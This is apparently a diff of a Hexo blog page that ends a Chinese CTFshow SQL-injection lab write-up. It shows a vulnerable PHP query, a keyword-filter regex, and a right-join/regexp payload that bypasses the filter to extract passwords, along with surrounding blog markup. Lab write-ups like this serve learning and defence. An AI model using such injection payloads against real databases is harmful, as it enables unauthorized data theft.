+<h2 id="184关"><a href="#184关" class="headerlink" title="184关"></a>184关</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select count(*) from &quot;.$_POST[<span class="string">&#x27;tableName&#x27;</span>].&quot;;&quot;;</span><br><span class="line"><span class="keyword">function</span> waf($str)&#123;</span><br><span class="line">   <span class="keyword">return</span> preg_match(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;</span><span class="operator">|</span>\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line"> &#125;</span><br><span class="line"> $user_count = 0;</span><br></pre></td></tr></table></figure>
+
+<p>这题和上一题的思路不同了，但这次把空格放出来了，同时也多过滤了where和select，根据我现在看是无法直接把flag找出来了，看了题解试下right join 联合查询，那样就不需要使用where了</p>
+<img src="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250309171357554.png" class="lazyload" data-srcset="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/image-20250309171357554.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250309171357554">
+
+<p>我们直接查ctfshow_user会有22条数据，然后再联合查询发现有44条数据，匹配不存在字符时就只有22条数据，也就是这条语句可以用。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName<span class="operator">=</span>ctfshow_user <span class="keyword">as</span> a <span class="keyword">right</span> <span class="keyword">join</span> ctfshow_user <span class="keyword">on</span> (a.pass regexp(<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
+
+
+  </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-21T17:17:52+08:00">2025-01-21</time>
-        
-      </div>
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-09T18:21:37+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Mar 9, 2025</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/15/Buuctf/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/&title=ctfshowSQL注入 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/&title=ctfshowSQL注入 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/&title=ctfshowSQL注入 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
   
   
+
   
+    <div class="prev-next">
+      
+        <a class='prev' href='/2025/03/06/requests%E5%BA%93/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>requests库</p>
+          <p class='content'>requests库笔记前言唉，ctfshow上面sql注入和sqli-lab难度跨越有点大，反正我感觉有点难了，但php特性和反序列化也在继续。突然想起python和requests库还没学，还...</p>
+        </a>
+      
+      
+        <a class='next' href='/2025/02/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+          <p class='title'>php反序列化<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>PHP反序列化笔记前言最近有点摆烂啊，心情也不是很好，今天选课羽毛球这么重要的运动竟然没得选，只好去打网球，但网球和羽毛球可是在某种意义上相违背的。还有就是，电子电路和离散数学是真的不想听，数据...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/15/Buuctf/"  itemprop="url">
-        Buuctf
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        buuctf笔记前言此笔记用于记录在buuctf web上做题的笔记与题解
-1.[极客大挑战 2019]EasySQL第一题当然是最简单的，一个普通的万能密码即可
+
+    <div id="layoutHelper-comments"></div>
+
+  </article>
 
 
-此关必须输入用户名和密码，应该是提前判定不得为空
-2.[极客大挑战 2019]Havefun本题界面无任何可操作的东西，于是我们可以通过查看界面源代码看下是否有提示
 
 
-我们可以看到注释当$cat&#x3D;’dog’时有输出...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-15T22:02:33+08:00">2025-01-15</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/15/Buuctf/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/12/sql注入/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/12/sql%E6%B3%A8%E5%85%A5/"  itemprop="url">
-        sql注入
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        sql注入笔记前言本笔记用于记录学习SQL注入时的笔记，记录了在sql-labs上使用的各种注入方法。
-1.注入点判断SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。
-参数类型分类
-
-数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。
-
-如 text.com&#x2F;text.php?id&#x3D;3 对应的sql语句为 sel...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-12T13:28:35+08:00">2025-01-12</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/12/sql%E6%B3%A8%E5%85%A5/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/03/MySQL/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/03/MySQL/"  itemprop="url">
-        MySQL
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        MySQL笔记1.MySQL简介数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。
-每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。
-我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。
-所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-03T17:06:10+08:00">2025-01-03</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/03/MySQL/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/02/Python/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/02/Python/"  itemprop="url">
-        Python
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        Python学习笔记前言感觉漏洞有点难，突然想到python还没学，也不好写脚本，仿佛看到救世主一般的来了，由于以前学过C语言，所以只挑重点学
-1.数据类型Python 支持三种不同的数值类型：
-
-整型(int) - 通常被称为是整型或整数，是正或负整数，不带小数点。Python3 整型是没有限制大小的，可以当作 Long 类型使用，所以 Python3 没有 Python2 的 Long ...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-02T18:38:49+08:00">2025-01-02</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/01/02/Python/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
 
 
-	
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2839,97 +2851,48 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
     
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#172%E5%85%B3"><span class="toc-text">172关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E5%90%8D%E8%BF%87%E6%BB%A4"><span class="toc-text">1.用户名过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#174%E5%85%B3"><span class="toc-text">174关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">1.数字过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#175%E5%85%B3"><span class="toc-text">175关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-into-outfile-%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE"><span class="toc-text">1.into outfile()导出数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#177%E5%85%B3"><span class="toc-text">177关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-text">1.空格过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#181%E5%85%B3"><span class="toc-text">181关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#183%E5%85%B3-%E5%BC%80%E5%A7%8B%E5%86%99%E8%84%9A%E6%9C%AC%E4%BA%86"><span class="toc-text">183关 开始写脚本了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#184%E5%85%B3"><span class="toc-text">184关</span></a></li></ol>
+    </div>
+  </section>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -2957,13 +2920,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2972,14 +2936,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="half";
-      cover_wrapper.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
       scroll_down.style.display="none";
     
   
@@ -3477,7 +3441,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/archives/2025/","name":"2025"}},{"@type":"ListItem","position":4,"item":{"@id":"http://example.com/archives/2025/1/","name":"1"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/03/04/ctfshowSQL注入/","name":"ctfshowSQL注入"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"ctfshowSQL注入","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/03/04/ctfshowSQL%E6%B3%A8%E5%85%A5/","wordCount":0,"datePublished":"2025-03-04T11:58:06.000Z","dateModified":"2025-03-09T10:21:37.212Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
